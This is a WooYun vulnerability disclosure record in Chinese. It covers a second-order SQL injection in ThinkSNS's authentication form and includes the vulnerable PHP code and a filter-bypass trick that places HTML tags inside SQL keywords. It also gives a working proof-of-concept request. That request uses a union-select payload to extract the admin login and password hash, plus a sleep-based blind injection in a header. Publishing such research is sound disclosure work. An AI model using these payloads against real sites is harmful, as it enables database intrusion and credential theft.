{"id": 48356, "wybug_id": "wooyun-2014-079805", "wybug_title": "ThinkSNS某处二次注入Bypass防御获取任意数据", "wybug_corp": "ThinkSNS", "wybug_author": "xfkxfk", "wybug_date": "2014-10-18 08:09", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-23：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： ThinkSNS某处二次注入Bypass防御获取任意数据 详细说明：  第一部分：漏洞分析文件/apps/public/Lib/Action/AccountAction.class.php\n/**     * 提交申请认证     * @return void     */    public function doAuthenticate(){    \t$verifyInfo = D('user_verified')->where('uid='.$this->mid)->find();              $data['usergroup_id'] = intval($_POST['usergroup_id']);        if(!$data['usergroup_id']) $data['usergroup_id'] = 5;       \t$data['company'] = t($_POST['company']);\t        $data['realname'] = t($_POST['realname']);        $data['idcard'] = t($_POST['idcard']);        $data['phone'] = t($_POST['phone']);        $data['reason'] = t($_POST['reason']);        //$data['info'] = t($_POST['info']);        $data['attach_id'] = t($_POST['attach_ids']);//attach_ids通过t函数过滤        if(D('user_verified_category')->where('pid='.$data['usergroup_id'])->find()){        \t$data['user_verified_category_id'] = intval($_POST['verifiedCategory']);    \t}else{    \t\t$data['user_verified_category_id'] = 0;    \t}        $Regx1 = '/^[0-9]*$/';        $Regx2 = '/^[A-Za-z0-9]*$/';        $Regx3 = '/^[A-Za-z|\\x{4e00}-\\x{9fa5}]+$/u';......preg_match_all('/./us', $data['reason'], $matchs);   //一个汉字也为一个字符        if(count($matchs[0])>140){        \t//$this->error('认证理由不能超过140个字符');\t        \techo '认证理由不能超过140个字符';exit;        }        // preg_match_all('/./us', $data['info'], $match);   //一个汉字也为一个字符        // if(count($match[0])>140){        // \t$this->error('认证资料不能超过140个字符');\t        // }           \tif($verifyInfo){    \t\t$data['verified'] = 0;    \t\t$res = D('user_verified')->where('uid='.$verifyInfo['uid'])->save($data);//data数据进入数据库    \t}else{    \t\t$data['uid'] = $this->mid;     \t\t$res = D('user_verified')->add($data);    \t}        if($res){        \t//echo '1';        \tmodel('Notify')->sendNotify($this->mid,'public_account_doAuthenticate');        \t$touid = D('user_group_link')->where('user_group_id=1')->field('uid')->findAll();\t\t\tforeach($touid as $k=>$v){\t\t\t\tmodel('Notify')->sendNotify($v['uid'], 'verify_audit');\t\t\t}        \t//return $this->ajaxReturn(null, '申请成功，请等待审核', 1);        \techo '1';        }else{        \t//$this->error(\"申请失败\");        \techo '申请失败';exit;        }    }\n此时attach_ids已经进入数据库了下面来看看出库的地方\n/**     * 申请认证     * @return void     */    public function authenticate(){    \t$auType = model('UserGroup')->where('is_authenticate=1')->findall();    \t$this->assign('auType', $auType);    \t$verifyInfo = D('user_verified')->where('uid='.$this->mid)->find();    \tif($verifyInfo['attach_id']){\t\t\t  $a = explode('|', $verifyInfo['attach_id']);\t\t\t  foreach($a as $key=>$val){\t\t\t  \tif($val !== \"\") {\t\t\t  \t\t$attachInfo = D('attach')->where(\"attach_id=$a[$key]\")->find();//attach_id在这里进入数据库\t\t\t  \t\t$verifyInfo['attachment'] .= $attachInfo['name'].'&nbsp;<a href=\"'.getImageUrl($attachInfo['save_path'].$attachInfo['save_name']).'\" target=\"_blank\">下载</a><br />';\t\t\t  \t}\t\t\t  }\t\t}\n可以看到，取出attach_id后，通过|分割，然后再次计入了数据库这里没有引号保护，导致sql注入所以只要我们在attach_id插入恶意数据即可二次触发第二部分：bypass绕过分析来看看t函数是否能绕过/core/OpenSociax/functions.inc.php\n/** * t函数用于过滤标签，输出没有html的干净的文本 * @param string text 文本内容 * @return string 处理后内容 */function t($text){    $text = nl2br($text);    $text = real_strip_tags($text);    $text = addslashes($text);    $text = trim($text);    return $text;}\n这里有一个real_strip_tags函数来看看\nfunction real_strip_tags($str, $allowable_tags=\"\") {    $str = html_entity_decode($str,ENT_QUOTES,'UTF-8');    return strip_tags($str, $allowable_tags);}\n这里将html过滤掉了综上，当恶意sql语句进入t时，首先将html标签过滤，然后进入addslashes那么我们在sql关键字中插入html标签即可绕过全局防御了如select=se<a>lect，这样绕过了全局，最后又变成了select，成功绕过   漏洞证明：  1、前台登陆，在个人信息处，申请认证\nhttp://localhost/thinksns/index.php?app=public&mod=Account&act=Authenticate\n2、然后提交时，抓包，将attach_ids修改为：\nattach_ids=%7C76%7C-1 un<a>ion se<a>lect 1,2,3,4,5,6,7,(se<a>lect co<a>ncat(login,0x23,password) fr<a>om ts_user li<a>mit 1),9,10,11,12,13,14,15,16,17,18,19,20#%7C\n请求如下：\nHost: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://localhost/thinksns/index.php?app=public&mod=Account&act=authenticateContent-Length: 156Cookie: CNZZDATA80862620=cnzz_eid%3D1277534265-1407229558-%26ntime%3D1411435759; bdshare_firstime=1407229707189; pgv_pvi=3674949632; cuz_auth=W25fXgRlUGYBbgdpB28EYFoyAmVSDgJnAg0CZgNjUT5VYQo7VzZXNFBmU2UBYQVhAj5SNFRiUTVXMAFkCGhUYFtpX2cENlBgATMHYgczBDVaNwIyUjcCYwI0Al8DMQ; cuz_userid=1; cuz_username=admin123; cej_username=admin123; cej_auth=fhtuNEBwVjcReA5jMQgdKnEVeklmPnVMWFpWYGMOA2RgBAJoVGReahoqJxI7Cg45R3dCcAw%2BX2dmDHVCVzooFH4cbg1AI1YxESUOaDFUHX9xEHoeZgd1SFhjVlljXA; cej_userid=1; PHPSESSID=2b74f139fdd6ec4d629fc2bce0a85e95; CNZZDATA1702264=cnzz_eid%3D2084647819-1413523648-http%253A%252F%252Flocalhost%252F%26ntime%3D1413523648; T3_online_update=1413552570; T3_TSV3_LOGGED_USER=fb8DZUmtTTQ17neIIPi6M7u8bJccMAEjX-Forwarded-For: 127.0.0.1',`email`=(if(mid(user(),1,1)=char(114),sleep(3),0))#Connection: keep-alivePragma: no-cacheCache-Control: no-cacheusergroup_id=&company=&realname=%E5%95%8A%E5%95%8A%E5%95%8A&idcard=111111111111111111&phone=13111111111&reason=111111&verifiedCategory=1&attach_ids=%7C76%7C-1 un<a>ion se<a>lect 1,2,3,4,5,6,7,(se<a>lect co<a>ncat(login,0x23,password) fr<a>om ts_user li<a>mit 1),9,10,11,12,13,14,15,16,17,18,19,20#%7C\n3、然后回到第1步：访问\nhttp://localhost/thinksns/index.php?app=public&mod=Account&act=Authenticate\n此时在认证附件处显示管理员账户信息：\n\n当然如果条件满足的话直接GetShell也是ok的   修复方案：  1、where后面的条件为嘛不加保护咧？2、防御逻辑出错了   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-18 17:37 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  http://loudong.360.cn/vul/info/id/26385在这里获得了3000元。还提啊    \n     2014-10-18 17:47 |    \t\tkill \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | >-<)\t\t \n  楼上的 冷少linso  是你吧    \n     2014-10-20 11:01 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @老和尚 求数字漏洞细节，谢谢    \n     2014-10-23 21:19 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @xfkxfk 那个可能是我之前提交的http://wooyun.org/bugs/wooyun-2010-079186，我这个是文件包含getshell的    \n     2014-10-24 09:09 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @phith0n 公开了你就知道了是不是一样的    \n     2014-10-24 10:58 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @xfkxfk 数字的洞不会公开吧。。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}